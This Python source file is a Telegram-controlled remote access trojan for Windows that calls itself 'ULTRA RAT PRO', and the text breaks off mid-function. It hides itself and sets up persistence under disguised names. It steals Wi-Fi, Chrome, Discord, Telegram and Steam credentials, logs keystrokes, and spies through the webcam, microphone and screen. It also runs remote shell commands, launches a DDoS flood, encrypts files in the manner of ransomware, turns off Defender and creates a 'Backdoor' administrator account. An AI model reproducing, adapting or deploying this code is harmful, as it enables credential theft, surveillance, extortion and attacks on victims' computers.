import asyncio
import os
import subprocess
import cv2
import platform
import socket
import getpass
import sys
import time
import psutil
import pyautogui
import webbrowser
from datetime import datetime
from PIL import ImageGrab
import threading
import numpy as np
import shutil
import winreg
import ctypes
import json
import zipfile
import sqlite3
import re
import win32com.client
import win32clipboard
import win32api
import email
import email.mime.text
import email.mime.multipart
import smtplib
import hashlib
import mouse as mouse_lib
import keyboard as keyboard_lib
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton, FSInputFile
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage

try:
    from pynput import keyboard, mouse
    PYNPUT_AVAILABLE = True
except:
    PYNPUT_AVAILABLE = False

try:
    import pygame
    PYGAME_AVAILABLE = True
except:
    PYGAME_AVAILABLE = False

try:
    import requests
    REQUESTS_AVAILABLE = True
except:
    REQUESTS_AVAILABLE = False

try:
    import sounddevice as sd
    import soundfile as sf
    AUDIO_AVAILABLE = True
except:
    AUDIO_AVAILABLE = False

try:
    from Crypto.Cipher import AES
    CRYPTO_AVAILABLE = True
except:
    CRYPTO_AVAILABLE = False

TOKEN = "PASTE_YOUR_BOT_TOKEN"
CHAT_ID = 11111111

bot = Bot(token=TOKEN)
dp = Dispatcher(storage=MemoryStorage())

keylogger_active = False
keylogger_listener = None
mouse_listener = None
keylog_buffer = []
clipboard_monitor_active = False
keyword_alert_active = False
keyword_list = ["password", "login", "bank", "card", "cvv", "bitcoin", "wallet"]
macro_recording = False
macro_events = []

class Form(StatesGroup):
    waiting_for_screen_record = State()
    waiting_for_camera_record = State()
    waiting_for_audio_record = State()
    waiting_for_cmd = State()
    waiting_for_kill = State()
    waiting_for_url = State()
    waiting_for_message = State()
    waiting_for_list = State()
    waiting_for_delete = State()
    waiting_for_write = State()
    waiting_for_clipboard = State()
    waiting_for_upload_path = State()
    waiting_for_zip = State()
    waiting_for_block_input = State()
    waiting_for_ddos = State()
    waiting_for_email = State()
    waiting_for_ransom = State()
    waiting_for_keyword = State()
    waiting_for_macro_name = State()
    waiting_for_file_download = State()
    waiting_for_wallpaper = State()
    waiting_for_music = State()
    waiting_for_upload_file = State()

def add_to_startup():
    try:
        if getattr(sys, 'frozen', False):
            exe_path = sys.executable
        else:
            exe_path = os.path.abspath(__file__)
            if exe_path.endswith('.py'):
                exe_path = f'"{sys.executable}" "{exe_path}"'
        
        key = winreg.HKEY_CURRENT_USER
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        key_handle = winreg.OpenKey(key, key_path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key_handle, "WindowsSecurity", 0, winreg.REG_SZ, exe_path)
        winreg.CloseKey(key_handle)
        
        startup_folder = os.path.expanduser('~') + r'\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'
        os.makedirs(startup_folder, exist_ok=True)
        bat_path = os.path.join(startup_folder, "SecurityUpdate.bat")
        with open(bat_path, 'w') as f:
            f.write(f'@echo off\nstart "" {exe_path}')
        
        task = f'schtasks /create /tn "WindowsSecurityTask" /tr "{exe_path}" /sc onlogon /rl HIGHEST /f'
        subprocess.run(task, shell=True, capture_output=True)
        return True
    except:
        return False

def check_startup():
    try:
        key = winreg.HKEY_CURRENT_USER
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        key_handle = winreg.OpenKey(key, key_path, 0, winreg.KEY_READ)
        try:
            winreg.QueryValueEx(key_handle, "WindowsSecurity")
            winreg.CloseKey(key_handle)
            return True
        except:
            winreg.CloseKey(key_handle)
            return False
    except:
        return False

def hide_process():
    try:
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        ctypes.windll.user32.ShowWindow(hwnd, 0)
    except:
        pass

async def send_message(text):
    try:
        if len(text) > 4000:
            for i in range(0, len(text), 4000):
                await bot.send_message(CHAT_ID, text[i:i+4000])
        else:
            await bot.send_message(CHAT_ID, text)
    except:
        pass

async def send_file(filepath, caption=""):
    try:
        await bot.send_document(CHAT_ID, FSInputFile(filepath), caption=caption)
        return True
    except:
        return False

def take_screenshot():
    try:
        screenshot = ImageGrab.grab(all_screens=True)
        filename = f"screen_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
        screenshot.save(filename, "PNG")
        return filename
    except:
        return None

def take_photo():
    try:
        cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
        cap.set(cv2.CAP_PROP_FRAME_WIDTH, 1920)
        cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 1080)
        time.sleep(0.5)
        ret, frame = cap.read()
        cap.release()
        if ret:
            filename = f"cam_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
            cv2.imwrite(filename, frame, [cv2.IMWRITE_PNG_COMPRESSION, 0])
            return filename
    except:
        pass
    return None

def record_screen(duration=10):
    try:
        fps = 30
        screen_size = pyautogui.size()
        fourcc = cv2.VideoWriter_fourcc(*'H264')
        filename = f"screen_rec_{datetime.now().strftime('%Y%m%d_%H%M%S')}.mp4"
        out = cv2.VideoWriter(filename, fourcc, fps, screen_size)
        start = time.time()
        while time.time() - start < duration:
            img = pyautogui.screenshot()
            frame = np.array(img)
            frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
            out.write(frame)
        out.release()
        return filename
    except:
        return None

def record_camera(duration=10):
    try:
        cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
        cap.set(cv2.CAP_PROP_FRAME_WIDTH, 1920)
        cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 1080)
        fps = 30
        width = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH))
        height = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))
        fourcc = cv2.VideoWriter_fourcc(*'H264')
        filename = f"cam_rec_{datetime.now().strftime('%Y%m%d_%H%M%S')}.mp4"
        out = cv2.VideoWriter(filename, fourcc, fps, (width, height))
        start = time.time()
        while time.time() - start < duration:
            ret, frame = cap.read()
            if ret:
                out.write(frame)
        cap.release()
        out.release()
        return filename
    except:
        return None

def get_wifi_passwords():
    try:
        output = subprocess.check_output('netsh wlan show profiles', shell=True).decode('cp866', errors='ignore')
        profiles = re.findall(r'Все профили пользователей\s*:\s*(.+)', output)
        result = "📡 WiFi пароли:\n\n"
        for profile in profiles:
            profile = profile.strip()
            try:
                info = subprocess.check_output(f'netsh wlan show profile "{profile}" key=clear', shell=True).decode('cp866', errors='ignore')
                password = re.search(r'Содержимое ключа\s*:\s*(.+)', info)
                if password:
                    result += f"📶 {profile}: {password.group(1)}\n"
            except:
                pass
        return result
    except:
        return "Не удалось получить пароли WiFi"

def get_chrome_data():
    try:
        login_db = os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Default\Login Data'
        temp_db = 'temp_chrome.db'
        shutil.copy2(login_db, temp_db)
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
        result = "🔐 Пароли Chrome:\n\n"
        for row in cursor.fetchall():
            result += f"🌐 {row[0][:50]}\n👤 {row[1]}\n\n"
        conn.close()
        os.remove(temp_db)
        return result
    except:
        return "Chrome не найден или закрыт"

def get_chrome_cookies():
    try:
        cookie_db = os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies'
        temp_db = 'temp_cookies.db'
        shutil.copy2(cookie_db, temp_db)
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute('SELECT host_key, name, encrypted_value FROM cookies LIMIT 50')
        result = "🍪 Cookies Chrome:\n\n"
        for row in cursor.fetchall():
            result += f"🌐 {row[0]}: {row[1]}\n"
        conn.close()
        os.remove(temp_db)
        return result
    except:
        return "Cookies не найдены"

def get_discord_token():
    tokens = []
    paths = [
        os.path.expanduser('~') + r'\AppData\Roaming\discord\Local Storage\leveldb',
        os.path.expanduser('~') + r'\AppData\Roaming\discordcanary\Local Storage\leveldb'
    ]
    for path in paths:
        if os.path.exists(path):
            for file in os.listdir(path):
                if file.endswith('.ldb') or file.endswith('.log'):
                    try:
                        with open(os.path.join(path, file), 'r', errors='ignore') as f:
                            content = f.read()
                            found = re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', content)
                            tokens.extend(found)
                    except:
                        pass
    return list(set(tokens))

def get_telegram_session():
    try:
        tg_path = os.path.expanduser('~') + r'\AppData\Roaming\Telegram Desktop\tdata'
        if os.path.exists(tg_path):
            zipname = f"telegram_{datetime.now().strftime('%Y%m%d_%H%M%S')}.zip"
            with zipfile.ZipFile(zipname, 'w', zipfile.ZIP_DEFLATED) as zipf:
                for root, dirs, files in os.walk(tg_path):
                    for file in files:
                        if 'dumps' not in root:
                            zipf.write(os.path.join(root, file), file)
            return zipname
    except:
        pass
    return None

def get_steam_accounts():
    try:
        steam_path = r'C:\Program Files (x86)\Steam\config\loginusers.vdf'
        if os.path.exists(steam_path):
            with open(steam_path, 'r', encoding='utf-8') as f:
                content = f.read()
                users = re.findall(r'"(\d+)"\s*{', content)
                return f"🎮 Steam аккаунты: {len(users)}"
    except:
        pass
    return "Steam не найден"

def get_clipboard_data():
    try:
        win32clipboard.OpenClipboard()
        try:
            data = win32clipboard.GetClipboardData()
        except:
            data = None
        win32clipboard.CloseClipboard()
        return data
    except:
        return None

def set_clipboard_data(text):
    try:
        win32clipboard.OpenClipboard()
        win32clipboard.EmptyClipboard()
        win32clipboard.SetClipboardText(text)
        win32clipboard.CloseClipboard()
        return True
    except:
        return False

async def monitor_clipboard():
    last_clip = ""
    while clipboard_monitor_active:
        try:
            current = get_clipboard_data()
            if current and current != last_clip:
                last_clip = current
                await send_message(f"📋 Буфер обмена изменился:\n{str(current)[:500]}")
        except:
            pass
        await asyncio.sleep(2)

async def monitor_keywords():
    last_clip = ""
    while keyword_alert_active:
        try:
            current = get_clipboard_data()
            if current and current != last_clip:
                last_clip = current
                for kw in keyword_list:
                    if kw.lower() in str(current).lower():
                        await send_message(f"⚠️ Обнаружено ключевое слово '{kw}' в буфере обмена!")
                        scr = take_screenshot()
                        if scr:
                            await send_file(scr, f"Скриншот при обнаружении '{kw}'")
                            os.remove(scr)
                        break
        except:
            pass
        await asyncio.sleep(2)

def get_system_info_full():
    info = "🖥 ИНФОРМАЦИЯ О СИСТЕМЕ\n\n"
    info += f"💻 ОС: {platform.system()} {platform.release()} {platform.version()}\n"
    info += f"👤 Пользователь: {getpass.getuser()}\n"
    info += f"🏠 Компьютер: {platform.node()}\n"
    info += f"🌐 Локальный IP: {socket.gethostbyname(socket.gethostname())}\n"
    if REQUESTS_AVAILABLE:
        try:
            ip = requests.get('https://api.ipify.org', timeout=3).text
            info += f"🌍 Внешний IP: {ip}\n"
        except:
            pass
    try:
        output = subprocess.check_output('wmic path win32_VideoController get name', shell=True).decode()
        gpu = output.split('\n')[1].strip()
        info += f"🎮 GPU: {gpu}\n"
    except:
        pass
    info += f"\n⚙️ ПРОЦЕССОР: {platform.processor()}\n"
    info += f"🔢 Ядер: {psutil.cpu_count()} | Загрузка: {psutil.cpu_percent()}%\n"
    mem = psutil.virtual_memory()
    info += f"\n💾 ПАМЯТЬ: {mem.used//(1024**3)}/{mem.total//(1024**3)} GB ({mem.percent}%)\n"
    info += "\n💿 ДИСКИ:\n"
    for part in psutil.disk_partitions():
        try:
            usage = psutil.disk_usage(part.mountpoint)
            info += f"📀 {part.device}: {usage.free//(1024**3)} GB свободно\n"
        except:
            pass
    try:
        battery = psutil.sensors_battery()
        if battery:
            info += f"\n🔋 БАТАРЕЯ: {battery.percent}%\n"
    except:
        pass
    boot_time = datetime.fromtimestamp(psutil.boot_time())
    info += f"\n⏰ ЗАПУЩЕН: {boot_time.strftime('%Y-%m-%d %H:%M:%S')}\n"
    info += f"⚡ АВТОЗАГРУЗКА: {'✅ Включена' if check_startup() else '❌ Выключена'}\n"
    return info

def start_keylogger():
    global keylogger_active, keylogger_listener, mouse_listener, keylog_buffer
    if not PYNPUT_AVAILABLE:
        return False
    keylogger_active = True
    keylog_buffer = []
    def on_press(key):
        if not keylogger_active:
            return False
        try:
            keylog_buffer.append(key.char if key.char else f'[{key}]')
        except:
            keylog_buffer.append(f'[{key}]')
    def on_click(x, y, button, pressed):
        if pressed and keylogger_active:
            keylog_buffer.append(f'[🖱 {button} в {x},{y}]')
    keylogger_listener = keyboard.Listener(on_press=on_press)
    mouse_listener = mouse.Listener(on_click=on_click)
    keylogger_listener.start()
    mouse_listener.start()
    return True

def stop_keylogger():
    global keylogger_active, keylogger_listener, mouse_listener
    keylogger_active = False
    if keylogger_listener:
        keylogger_listener.stop()
    if mouse_listener:
        mouse_listener.stop()
    return True

def get_keylog():
    if keylog_buffer:
        return ''.join(keylog_buffer)
    return None

def execute_cmd(command):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
        return result.stdout + result.stderr
    except subprocess.TimeoutExpired:
        return "⏰ Команда превысила время выполнения"
    except Exception as e:
        return f"❌ Ошибка: {e}"

def kill_process(name):
    try:
        killed = 0
        for proc in psutil.process_iter(['name']):
            if name.lower() in proc.info['name'].lower():
                proc.kill()
                killed += 1
        return f"✅ Убито процессов: {killed}"
    except:
        return "❌ Ошибка"

def get_processes():
    processes = []
    for proc in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent']):
        try:
            processes.append(proc.info)
        except:
            pass
    processes.sort(key=lambda x: x['cpu_percent'] if x['cpu_percent'] else 0, reverse=True)
    result = "📊 ТОП-15 ПРОЦЕССОВ:\n\n"
    for p in processes[:15]:
        result += f"• {p['name']} (PID: {p['pid']}) - CPU: {p['cpu_percent']:.1f}% RAM: {p['memory_percent']:.1f}%\n"
    return result

def show_message(text):
    try:
        ctypes.windll.user32.MessageBoxW(0, text, "СООБЩЕНИЕ", 0x40)
        return True
    except:
        return False

def open_url(url):
    try:
        if not url.startswith('http'):
            url = 'https://' + url
        webbrowser.open(url)
        return True
    except:
        return False

def control_volume(action):
    try:
        if action == "up":
            for _ in range(5):
                pyautogui.press('volumeup')
        elif action == "down":
            for _ in range(5):
                pyautogui.press('volumedown')
        elif action == "mute":
            pyautogui.press('volumemute')
        return True
    except:
        return False

def mouse_control(action):
    try:
        if action == "up":
            pyautogui.moveRel(0, -100)
        elif action == "down":
            pyautogui.moveRel(0, 100)
        elif action == "left":
            pyautogui.moveRel(-100, 0)
        elif action == "right":
            pyautogui.moveRel(100, 0)
        elif action == "click":
            pyautogui.click()
        elif action == "right_click":
            pyautogui.rightClick()
        elif action == "double":
            pyautogui.doubleClick()
        elif action == "scroll_up":
            pyautogui.scroll(3)
        elif action == "scroll_down":
            pyautogui.scroll(-3)
        return True
    except:
        return False

def keyboard_press(key):
    try:
        pyautogui.press(key)
        return True
    except:
        return False

def write_text(text):
    try:
        pyautogui.write(text)
        return True
    except:
        return False

def system_action(action):
    try:
        if action == "shutdown":
            os.system("shutdown /s /t 5")
        elif action == "reboot":
            os.system("shutdown /r /t 5")
        elif action == "lock":
            os.system("rundll32.exe user32.dll,LockWorkStation")
        elif action == "sleep":
            os.system("rundll32.exe powrprof.dll,SetSuspendState 0,1,0")
        elif action == "hibernate":
            os.system("shutdown /h")
        elif action == "logoff":
            os.system("shutdown /l")
        return True
    except:
        return False

def record_audio(duration=10):
    if not AUDIO_AVAILABLE:
        return None
    try:
        fs = 44100
        recording = sd.rec(int(duration * fs), samplerate=fs, channels=2)
        sd.wait()
        filename = f"audio_{datetime.now().strftime('%Y%m%d_%H%M%S')}.wav"
        sf.write(filename, recording, fs)
        return filename
    except:
        return None

async def download_and_play_music(file_id):
    try:
        file_info = await bot.get_file(file_id)
        downloaded = await bot.download_file(file_info.file_path)
        ext = file_info.file_path.split('.')[-1] if '.' in file_info.file_path else 'mp3'
        filename = f"music_{datetime.now().strftime('%Y%m%d_%H%M%S')}.{ext}"
        with open(filename, 'wb') as f:
            f.write(downloaded.read() if hasattr(downloaded, 'read') else downloaded)
        for _ in range(20):
            pyautogui.press('volumeup')
        if PYGAME_AVAILABLE:
            pygame.mixer.init()
            pygame.mixer.music.load(filename)
            pygame.mixer.music.set_volume(1.0)
            pygame.mixer.music.play()
        else:
            os.system(f'start /min {filename}')
        return True
    except:
        return False

def start_macro_record():
    global macro_recording, macro_events
    macro_recording = True
    macro_events = []
    def on_click(x, y, button, pressed):
        if macro_recording and pressed:
            macro_events.append(('click', x, y, str(button), time.time()))
    def on_key(key):
        if macro_recording:
            try:
                macro_events.append(('key', str(key.char if hasattr(key, 'char') else key), time.time()))
            except:
                pass
    threading.Thread(target=lambda: keyboard.Listener(on_press=on_key).start(), daemon=True).start()
    threading.Thread(target=lambda: mouse.Listener(on_click=on_click).start(), daemon=True).start()
    return True

def stop_macro_record():
    global macro_recording
    macro_recording = False
    return True

def play_macro():
    if not macro_events:
        return False
    start_time = macro_events[0][-1]
    for event in macro_events:
        if event[0] == 'click':
            _, x, y, button, t = event
            time.sleep(t - start_time)
            if 'left' in button.lower():
                pyautogui.click(x, y)
            elif 'right' in button.lower():
                pyautogui.rightClick(x, y)
            start_time = t
        elif event[0] == 'key':
            _, key, t = event
            time.sleep(t - start_time)
            if len(key) == 1:
                pyautogui.write(key)
            else:
                pyautogui.press(key.replace('[', '').replace(']', ''))
            start_time = t
    return True

def run_bsod():
    try:
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
        ctypes.windll.ntdll.NtRaiseHardError(0xC0000022, 0, 0, 0, 6, ctypes.byref(ctypes.c_uint()))
        return True
    except:
        return False

def create_zip_file(files):
    try:
        zipname = f"archive_{datetime.now().strftime('%Y%m%d_%H%M%S')}.zip"
        with zipfile.ZipFile(zipname, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for file in files:
                if os.path.exists(file):
                    zipf.write(file, os.path.basename(file))
        return zipname
    except:
        return None

def delete_file(path):
    try:
        if os.path.isfile(path):
            os.remove(path)
            return f"✅ Файл удален: {path}"
        elif os.path.isdir(path):
            shutil.rmtree(path)
            return f"✅ Папка удалена: {path}"
        else:
            return "❌ Файл не найден"
    except:
        return "❌ Ошибка удаления"

def list_directory(path):
    try:
        if not os.path.exists(path):
            path = os.getcwd()
        files = os.listdir(path)
        result = f"📁 ПАПКА: {path}\n\n"
        for f in sorted(files)[:30]:
            full = os.path.join(path, f)
            if os.path.isdir(full):
                result += f"📁 {f}\n"
            else:
                size = os.path.getsize(full) // 1024
                result += f"📄 {f} ({size} KB)\n"
        return result
    except:
        return "❌ Ошибка чтения папки"

def hide_taskbar():
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.user32.FindWindowW("Shell_TrayWnd", None), 0)
        return True
    except:
        return False

def show_taskbar():
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.user32.FindWindowW("Shell_TrayWnd", None), 5)
        return True
    except:
        return False

def disable_taskmgr():
    try:
        key = winreg.HKEY_CURRENT_USER
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
        key_handle = winreg.CreateKey(key, key_path)
        winreg.SetValueEx(key_handle, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key_handle)
        return True
    except:
        return False

def enable_taskmgr():
    try:
        key = winreg.HKEY_CURRENT_USER
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
        key_handle = winreg.OpenKey(key, key_path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key_handle, "DisableTaskMgr", 0, winreg.REG_DWORD, 0)
        winreg.CloseKey(key_handle)
        return True
    except:
        return False

def block_input(seconds=10):
    try:
        ctypes.windll.user32.BlockInput(True)
        time.sleep(seconds)
        ctypes.windll.user32.BlockInput(False)
        return True
    except:
        return False

def change_desktop_icons(state):
    try:
        if state == "hide":
            ctypes.windll.user32.ShowWindow(ctypes.windll.user32.FindWindowW("Progman", None), 0)
        else:
            ctypes.windll.user32.ShowWindow(ctypes.windll.user32.FindWindowW("Progman", None), 5)
        return True
    except:
        return False

def open_cd():
    try:
        ctypes.windll.winmm.mciSendStringW("set cdaudio door open", None, 0, None)
        return True
    except:
        return False

def close_cd():
    try:
        ctypes.windll.winmm.mciSendStringW("set cdaudio door closed", None, 0, None)
        return True
    except:
        return False

def beep(freq=1000, dur=1000):
    try:
        ctypes.windll.user32.Beep(freq, dur)
        return True
    except:
        return False

def ddos_attack(target, port=80, duration=60):
    try:
        def attack():
            start = time.time()
            while time.time() - start < duration:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(1)
                    s.connect((target, port))
                    s.send(b'GET / HTTP/1.1\r\nHost: ' + target.encode() + b'\r\n\r\n')
                    s.close()
                except:
                    pass
        threads = []
        for _ in range(100):
            t = threading.Thread(target=attack)
            t.start()
            threads.append(t)
        for t in threads:
            t.join()
        return True
    except:
        return False

def send_email(smtp_server, port, username, password, to_email, subject, body):
    try:
        msg = email.mime.multipart.MIMEMultipart()
        msg['From'] = username
        msg['To'] = to_email
        msg['Subject'] = subject
        msg.attach(email.mime.text.MIMEText(body, 'plain'))
        server = smtplib.SMTP(smtp_server, port)
        server.starttls()
        server.login(username, password)
        server.send_message(msg)
        server.quit()
        return True
    except:
        return False

def encrypt_files(path, password):
    if not CRYPTO_AVAILABLE:
        return False
    try:
        key = hashlib.sha256(password.encode()).digest()
        for root, dirs, files in os.walk(path):
            for file in files:
                if file.endswith(('.txt', '.doc', '.docx', '.xls', '.xlsx', '.pdf', '.jpg', '.png', '.mp4', '.zip')):
                    filepath = os.path.join(root, file)
                    try:
                        with open(filepath, 'rb') as f:
                            data = f.read()
                        cipher = AES.new(key, AES.MODE_EAX)
                        ciphertext, tag = cipher.encrypt_and_digest(data)
                        with open(filepath + '.locked', 'wb') as f:
                            for x in (cipher.nonce, tag, ciphertext):
                                f.write(x)
                        os.remove(filepath)
                    except:
                        pass
        return True
    except:
        return False

def disable_defender():
    try:
        subprocess.run('powershell Set-MpPreference -DisableRealtimeMonitoring $true', shell=True, capture_output=True)
        return True
    except:
        return False

def create_backdoor_user():
    try:
        subprocess.run('net user Backdoor Password123! /add', shell=True, capture_output=True)
        subprocess.run('net localgroup administrators Backdoor /add', shell=True, capture_output=True)
        subprocess.run('net user Backdoor /active:yes', shell=True, capture_output=True)
        return True
    except:
        return False

def change_wallpaper_from_file(filepath):
    try:
        ctypes.windll.user32.SystemParametersInfoW(20, 0, os.path.abspath(filepath), 3)
        return True
    except:
        return False

def get_main_keyboard():
    buttons = [
        ["ℹ️ ИНФО", "📸 СКРИН"],
        ["📷 ФОТО", "🎥 ВИДЕО ЭКРАН"],
        ["📹 ВИДЕО КАМЕРА", "⌨️ КЕЙЛОГ"],
        ["🖱 МЫШЬ", "⌨️ КЛАВИШИ"],
        ["🔒 БЛОК", "⏻ ВЫКЛ"],
        ["🔄 РЕБУТ", "💤 СОН"],
        ["📡 WIFI", "🔐 CHROME"],
        ["🍪 COOKIES", "🎮 DISCORD"],
        ["💬 TELEGRAM", "🎮 STEAM"],
        ["📋 БУФЕР", "📁 ФАЙЛЫ"],
        ["📊 ПРОЦЕССЫ", "💀 УБИТЬ"],
        ["🖥 CMD", "🌐 САЙТ"],
        ["💬 СООБЩЕНИЕ", "🎵 ГРОМКОСТЬ"],
        ["🎤 АУДИО", "🎵 МУЗОН"],
        ["🖼 ОБОИ", "⬇️ СКАЧАТЬ"],
        ["📤 ЗАГРУЗИТЬ", "🗑 УДАЛИТЬ"],
        ["📦 ZIP", "⌨️ НАПИСАТЬ"],
        ["📋 ВСТАВИТЬ", "🖥 ПАНЕЛЬ"],
        ["📀 CD-ROM", "🔊 BEEP"],
        ["🔒 БЛОК ВВОДА", "💣 DDoS"],
        ["📧 EMAIL", "🔐 ШИФР"],
        ["⚙️ АВТОЗАГРУЗКА", "🔄 РЕСТАРТ"],
        ["📋 МОНИТОР БУФЕРА", "🔑 КЛЮЧ СЛОВА"],
        ["🎬 МАКРОС", "🛡 DEFENDER OFF"],
        ["👤 BACKDOOR", "🔐 WINLOCK"],
        ["💀 BSOD"]
    ]
    keyboard = ReplyKeyboardMarkup(keyboard=[[KeyboardButton(text=btn) for btn in row] for row in buttons], resize_keyboard=True)
    return keyboard

def get_mouse_keyboard():
    buttons = [
        [InlineKeyboardButton(text="⬆️", callback_data="mouse_up"),
         InlineKeyboardButton(text="⬇️", callback_data="mouse_down")],
        [InlineKeyboardButton(text="⬅️", callback_data="mouse_left"),
         InlineKeyboardButton(text="➡️", callback_data="mouse_right")],
        [InlineKeyboardButton(text="🖱 ЛКМ", callback_data="mouse_click"),
         InlineKeyboardButton(text="🖱 ПКМ", callback_data="mouse_rclick")],
        [InlineKeyboardButton(text="🖱 2x", callback_data="mouse_double")],
        [InlineKeyboardButton(text="📜 ↑", callback_data="mouse_scroll_up"),
         InlineKeyboardButton(text="📜 ↓", callback_data="mouse_scroll_down")]
    ]
    return InlineKeyboardMarkup(inline_keyboard=buttons)

def get_keyboard_menu():
    buttons = [
        [InlineKeyboardButton(text="Enter", callback_data="key_enter"),
         InlineKeyboardButton(text="Esc", callback_data="key_esc")],
        [InlineKeyboardButton(text="Tab", callback_data="key_tab"),
         InlineKeyboardButton(text="Space", callback_data="key_space")],
        [InlineKeyboardButton(text="Backspace", callback_data="key_backspace"),
         InlineKeyboardButton(text="Delete", callback_data="key_delete")],
        [InlineKeyboardButton(text="Win", callback_data="key_win"),
         InlineKeyboardButton(text="Alt+Tab", callback_data="key_alttab")],
        [InlineKeyboardButton(text="Alt+F4", callback_data="key_altf4"),
         InlineKeyboardButton(text="Ctrl+C", callback_data="key_copy")],
        [InlineKeyboardButton(text="Ctrl+V", callback_data="key_paste"),
         InlineKeyboardButton(text="Ctrl+A", callback_data="key_all")],
        [InlineKeyboardButton(text="Win+R", callback_data="key_winr"),
         InlineKeyboardButton(text="Ctrl+Alt+Del", callback_data="key_cad")],
        [InlineKeyboardButton(text="PrintScr", callback_data="key_prtsc")]
    ]
    return InlineKeyboardMarkup(inline_keyboard=buttons)

def get_volume_menu():
    buttons = [[
        InlineKeyboardButton(text="🔊 +", callback_data="vol_up"),
        InlineKeyboardButton(text="🔉 -", callback_data="vol_down"),
        InlineKeyboardButton(text="🔇 Mute", callback_data="vol_mute")
    ]]
    return InlineKeyboardMarkup(inline_keyboard=buttons)

@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    if message.chat.id != CHAT_ID:
        return
    await message.answer("🤖 ULTRA RAT PRO - ГОТОВ", reply_markup=get_main_keyboard())

@dp.message(F.text)
async def handle_text(message: types.Message, state: FSMContext):
    if message.chat.id != CHAT_ID:
        return
    
    current_state = await state.get_state()
    text = message.text.upper() if message.text else ""
    
    if current_state == Form.waiting_for_screen_record:
        try:
            duration = min(int(message.text), 60)
            await message.answer(f"🎥 Запись {duration} сек...")
            filename = record_screen(duration)
            if filename:
                await send_file(filename, f"🎥 Запись экрана ({duration} сек)")
                os.remove(filename)
            else:
                await message.answer("❌ Ошибка записи")
        except:
            await message.answer("❌ Неверная длительность")
        await state.clear()
        return
    
    if current_state == Form.waiting_for_camera_record:
        try:
            duration = min(int(message.text), 60)
            await message.answer(f"📹 Запись {duration} сек...")
            filename = record_camera(duration)
            if filename:
                await send_file(filename, f"📹 Запись с камеры ({duration} сек)")
                os.remove(filename)
            else:
                await message.answer("❌ Камера не найдена")
        except:
            await message.answer("❌ Неверная длительность")
        await state.clear()
        return
    
    if current_state == Form.waiting_for_audio_record:
        try:
            duration = min(int(message.text), 60)
            await message.answer(f"🎤 Запись {duration} сек...")
            filename = record_audio(duration)
            if filename:
                await send_file(filename, f"🎤 Запись аудио ({duration} сек)")
                os.remove(filename)
            else:
                await message.answer("❌ Микрофон не найден")
        except:
            await message.answer("❌ Неверная длительность")
        await state.clear()
        return
    
    if current_state == Form.waiting_for_cmd:
        result = execute_cmd(message.text)
        await send_message(f"```\n{result[:3000]}\n```")
        await state.clear()
        return
    
    if current_state == Form.waiting_for_kill:
        result = kill_process(message.text)
        await message.answer(result)
        await state.clear()
        return
    
    if current_state == Form.waiting_for_url:
        if open_url(message.text):
            await message.answer(f"🌐 Открыто: {message.text}")
        await state.clear()
        return
    
    if current_state == Form.waiting_for_message:
        show_message(message.text)
        await message.answer("✅ Сообщение показано")
        await state.clear()
        return
    
    if current_state == Form.waiting_for_list:
        result = list_directory(message.text)
        await message.answer(result)
        await state.clear()
        return
    
    if current_state == Form.waiting_for_delete:
        result = delete_file(message.text)
        await message.answer(result)
        await state.clear()
        return
    
    if current_state == Form.waiting_for_write:
        write_text(message.text)
        await message.answer("✅ Текст введен")
        await state.clear()
        return
    
    if current_state == Form.waiting_for_clipboard:
        set_clipboard_data(message.text)
        await message.answer("✅ Скопировано в буфер")
        await state.clear()
        return
    
    if current_state == Form.waiting_for_upload_path:
        await state.update_data(upload_path=message.text)
        await state.set_state(Form.waiting_for_upload_file)
        await message.answer("📤 Отправьте файл для загрузки")
        return
    
    if current_state == Form.waiting_for_zip:
        files = [f.strip() for f in message.text.split(',')]
        filename = create_zip_file(files)
        if filename:
            await send_file(filename, "📦 Архив")
            os.remove(filename)
        else:
            await message.answer("❌ Ошибка создания архива")
        await state.clear()
        return
    
    if current_state == Form.waiting_for_block_input:
        try:
            duration = min(int(message.text), 30)
            threading.Thread(target=block_input, args=(duration,)).start()
            await message.answer(f"🔒 Ввод заблокирован на {duration} сек")
        except:
            await message.answer("❌ Неверная длительность")
        await state.clear()
        return
    
    if current_state == Form.waiting_for_ddos:
        try:
            target, port = message.text.split(':')
            port = int(port)
            threading.Thread(target=ddos_attack, args=(target, port, 30)).start()
            await message.answer(f"💣 DDoS атака на {target}:{port} запущена")
        except:
